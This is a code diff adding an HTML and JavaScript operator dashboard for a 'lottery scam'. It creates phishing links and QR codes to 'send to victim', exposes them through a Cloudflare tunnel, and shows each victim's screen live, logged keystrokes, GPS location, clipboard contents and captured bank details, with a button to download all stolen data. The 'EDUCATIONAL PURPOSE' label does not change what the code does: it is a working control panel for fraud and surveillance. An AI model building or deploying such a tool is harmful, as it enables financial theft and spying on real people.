@@ -1,0 +1,347 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🕵️ LOTTERY SCAM DASHBOARD</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial; 
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            color: #00ff88; min-height: 100vh; padding: 20px;
+        }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { font-size: 36px; text-shadow: 0 0 20px #00ff88; }
+        .panel { 
+            background: rgba(255,255,255,0.05); 
+            backdrop-filter: blur(10px); 
+            border: 1px solid #00ff88; 
+            border-radius: 15px; 
+            padding: 25px; 
+            margin-bottom: 25px;
+        }
+        .panel h2 { color: #00ff88; margin-bottom: 15px; font-size: 22px; border-bottom: 1px solid #00ff88; padding-bottom: 10px; }
+        button { 
+            background: linear-gradient(45deg, #ff4444, #cc0000); 
+            color: white; 
+            border: none; 
+            padding: 12px 24px; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            font-size: 14px;
+            transition: all 0.3s;
+            margin: 5px;
+        }
+        button:hover { transform: scale(1.05); box-shadow: 0 5px 15px rgba(255,68,68,0.4); }
+        button.secondary { background: linear-gradient(45deg, #00ff88, #00cc66); color: #000; }
+        #screenCanvas { 
+            width: 100%; max-height: 400px; 
+            border: 2px solid #00ff88; 
+            border-radius: 10px; 
+            background: #000;
+        }
+        .log-container { 
+            font-family: 'Courier New', monospace; 
+            background: #000; 
+            color: #ff4444; 
+            padding: 15px; 
+            height: 250px; 
+            overflow-y: scroll; 
+            border-radius: 8px;
+            font-size: 13px;
+        }
+        .data-item { 
+            background: rgba(0,255,136,0.1); 
+            padding: 10px; 
+            margin: 5px 0; 
+            border-radius: 8px; 
+            border-left: 4px solid #00ff88;
+        }
+        .bank-details {
+            background: rgba(255,215,0,0.2);
+            border-left: 4px solid #ffd700;
+            color: #ffd700;
+        }
+        .link-box { 
+            background: #00ff88; 
+            color: #000; 
+            padding: 15px; 
+            border-radius: 12px; 
+            font-family: monospace; 
+            font-size: 14px;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        input, select {
+            padding: 10px;
+            margin: 10px;
+            border-radius: 5px;
+            border: none;
+            font-size: 14px;
+        }
+        input { width: 60%; }
+        .session-selector { margin: 15px 0; }
+        .stats { display: inline-block; margin-left: 20px; font-size: 12px; color: #ffd700; }
+        pre { white-space: pre-wrap; word-wrap: break-word; margin: 5px 0; }
+        .success-text { color: #00ff88; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🕵️‍♂️ LOTTERY SCAM CONTROL PANEL</h1>
+        <p>Complete victim data theft dashboard - EDUCATIONAL PURPOSE</p>
+    </div>
+
+    <div class="panel">
+        <h2>🎯 Generate Scam Link</h2>
+        <div>
+            <input type="text" id="tunnelUrl" placeholder="Your Cloudflare Tunnel URL (e.g., https://random-name.trycloudflare.com)" style="width: 60%;">
+            <button onclick="setTunnelUrl()" class="secondary">Set Tunnel URL</button>
+        </div>
+        <button onclick="createScam()">🚨 Generate Lottery Scam Link</button>
+        <div id="scamLink"></div>
+        <div id="tunnelStatus" class="data-item" style="margin-top: 10px; display: none;"></div>
+    </div>
+
+    <div class="panel">
+        <h2>📊 Session Selector</h2>
+        <div class="session-selector">
+            <select id="sessionSelect" onchange="switchSession()">
+                <option value="">Select a session...</option>
+            </select>
+            <button onclick="refreshSessionData()" class="secondary">🔄 Refresh Data</button>
+            <button onclick="downloadAllData()" class="secondary">💾 Download All Data (JSON)</button>
+        </div>
+        <div id="sessionStats"></div>
+    </div>
+
+    <div class="panel">
+        <h2>📱 LIVE VICTIM SCREEN</h2>
+        <canvas id="screenCanvas" width="1280" height="720"></canvas>
+        <div id="screenStatus">Waiting for screen share...</div>
+    </div>
+
+    <div class="panel">
+        <h2>⌨️ REAL-TIME KEYLOGGER</h2>
+        <div id="keylog" class="log-container">No keystrokes captured yet...</div>
+    </div>
+
+    <div class="panel">
+        <h2>📍 GPS LOCATION</h2>
+        <div id="gpsLocation">-</div>
+    </div>
+
+    <div class="panel">
+        <h2>💰 BANK DETAILS (Captured)</h2>
+        <div id="bankDetails">-</div>
+    </div>
+
+    <div class="panel">
+        <h2>📋 CLIPBOARD DATA</h2>
+        <div id="clipboardData" class="log-container">-</div>
+    </div>
+
+    <script>
+        const socket = io();
+        let currentSession = null;
+        let tunnelBaseUrl = localStorage.getItem('tunnelUrl') || '';
+        let allSessions = {};
+
+        if (tunnelBaseUrl) {
+            document.getElementById('tunnelUrl').value = tunnelBaseUrl;
+        }
+
+        socket.on('connect', () => {
+            console.log('✅ Dashboard connected');
+            loadAllSessions();
+        });
+
+        function setTunnelUrl() {
+            tunnelBaseUrl = document.getElementById('tunnelUrl').value;
+            localStorage.setItem('tunnelUrl', tunnelBaseUrl);
+            
+            // Send to server
+            fetch('/set-ngrok', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ngrok_url: tunnelBaseUrl})
+            });
+            
+            document.getElementById('tunnelStatus').style.display = 'block';
+            document.getElementById('tunnelStatus').innerHTML = `✅ Tunnel URL saved: ${tunnelBaseUrl}<br>⚠️ Make sure cloudflared is running: cloudflared.exe tunnel --url http://localhost:5000`;
+            alert('✅ Tunnel URL saved: ' + tunnelBaseUrl);
+        }
+
+        async function createScam() {
+            const response = await fetch('/create');
+            const data = await response.json();
+            currentSession = data.session_id;
+            
+            const scamUrl = data.link;
+            document.getElementById('scamLink').innerHTML = `
+                <div class="data-item">
+                    <strong>📱 Send to Victim:</strong><br>
+                    <div class="link-box">${scamUrl}</div>
+                    <button onclick="copyLink('${scamUrl}')">📋 Copy Link</button>
+                    <button onclick="openLink('${scamUrl}')">🧪 Test Victim Page</button>
+                    <button onclick="generateQR('${scamUrl}')">📱 Generate QR Code</button>
+                </div>`;
+            
+            socket.emit('register_dashboard', {session_id: currentSession});
+            await loadAllSessions();
+        }
+
+        async function loadAllSessions() {
+            const response = await fetch('/get-all-sessions');
+            allSessions = await response.json();
+            
+            const select = document.getElementById('sessionSelect');
+            select.innerHTML = '<option value="">Select a session...</option>';
+            
+            for (const [sessionId, data] of Object.entries(allSessions)) {
+                const option = document.createElement('option');
+                option.value = sessionId;
+                const keyCount = data.keys?.length || 0;
+                const hasBank = data.bank_details ? '💰' : '';
+                option.textContent = `${sessionId} - Keys: ${keyCount} ${hasBank}`;
+                select.appendChild(option);
+            }
+        }
+
+        function switchSession() {
+            const select = document.getElementById('sessionSelect');
+            currentSession = select.value;
+            if (currentSession) {
+                refreshSessionData();
+                socket.emit('register_dashboard', {session_id: currentSession});
+            }
+        }
+
+        async function refreshSessionData() {
+            if (!currentSession) return;
+            
+            const response = await fetch(`/get-session-data/${currentSession}`);
+            const data = await response.json();
+            
+            document.getElementById('sessionStats').innerHTML = `
+                <span class="stats">📅 Started: ${new Date(data.start_time).toLocaleString()}</span>
+                <span class="stats">⌨️ Keys: ${data.keys?.length || 0}</span>
+                <span class="stats">📋 Clipboard: ${data.clipboard?.length || 0}</span>
+                <span class="stats">🖥️ Screens: ${data.screen_frames?.length || 0}</span>
+            `;
+            
+            if (data.gps) {
+                document.getElementById('gpsLocation').innerHTML = `
+                    <div class="data-item">
+                        📍 ${data.gps.lat?.toFixed(6)}, ${data.gps.lon?.toFixed(6)}<br>
+                        <small>Accuracy: ${data.gps.accuracy?.toFixed(0)}m</small><br>
+                        <small>Time: ${new Date(data.gps.timestamp).toLocaleString()}</small><br>
+                        <a href="https://www.google.com/maps?q=${data.gps.lat},${data.gps.lon}" target="_blank">View on Map →</a>
+                    </div>`;
+            }
+            
+            if (data.bank_details) {
+                document.getElementById('bankDetails').innerHTML = `
+                    <div class="data-item bank-details">
+                        <strong>💰 BANK DETAILS CAPTURED!</strong><br>
+                        <pre>${data.bank_details}</pre>
+                    </div>`;
+            } else {
+                document.getElementById('bankDetails').innerHTML = '<div class="data-item">No bank details captured yet</div>';
+            }
+            
+            if (data.keys && data.keys.length > 0) {
+                const keylogDiv = document.getElementById('keylog');
+                keylogDiv.innerHTML = data.keys.map(k => 
+                    `<div>[${new Date(k.datetime).toLocaleTimeString()}] ${k.key}</div>`
+                ).join('');
+                keylogDiv.scrollTop = keylogDiv.scrollHeight;
+            }
+            
+            if (data.clipboard && data.clipboard.length > 0) {
+                const clipDiv = document.getElementById('clipboardData');
+                clipDiv.innerHTML = data.clipboard.map(c => 
+                    `<div class="data-item">[${new Date(c.timestamp).toLocaleTimeString()}]<br><pre>${c.text}</pre></div>`
+                ).join('');
+                clipDiv.scrollTop = clipDiv.scrollHeight;
+            }
+        }
+
+        function downloadAllData() {
+            const dataStr = JSON.stringify(allSessions, null, 2);
+            const blob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `lottery_scam_data_${new Date().toISOString()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function copyLink(url) {
+            navigator.clipboard.writeText(url);
+            alert('✅ Scam link copied!');
+        }
+
+        function openLink(url) {
+            window.open(url, '_blank');
+        }
+
+        function generateQR(url) {
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
+            window.open(qrUrl, '_blank');
+        }
+
+        socket.on('new_screen', data => {
+            const canvas = document.getElementById('screenCanvas');
+            const ctx = canvas.getContext('2d');
+            const img = new Image();
+            img.onload = () => {
+                canvas.width = img.width;
+                canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+                document.getElementById('screenStatus').textContent = `📱 Live screen active (${img.width}x${img.height}) - ${new Date().toLocaleTimeString()}`;
+            };
+            img.src = `data:image/jpeg;base64,${data.frame}`;
+        });
+
+        socket.on('new_key', data => {
+            if (currentSession === data.session_id) {
+                const keylog = document.getElementById('keylog');
+                keylog.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${data.key}</div>`;
+                keylog.scrollTop = keylog.scrollHeight;
+            }
+            loadAllSessions();
+        });
+
+        socket.on('new_gps', data => {
+            if (currentSession === data.session_id) {
+                refreshSessionData();
+            }
+        });
+
+        socket.on('new_clipboard', data => {
+            if (currentSession === data.session_id) {
+                refreshSessionData();
+            }
+            loadAllSessions();
+        });
+        
+        socket.on('bank_details_received', () => {
+            refreshSessionData();
+            loadAllSessions();
+        });
+
+        setInterval(() => {
+            loadAllSessions();
+            if (currentSession) refreshSessionData();
+        }, 5000);
+    </script>
+</body>
+</html>
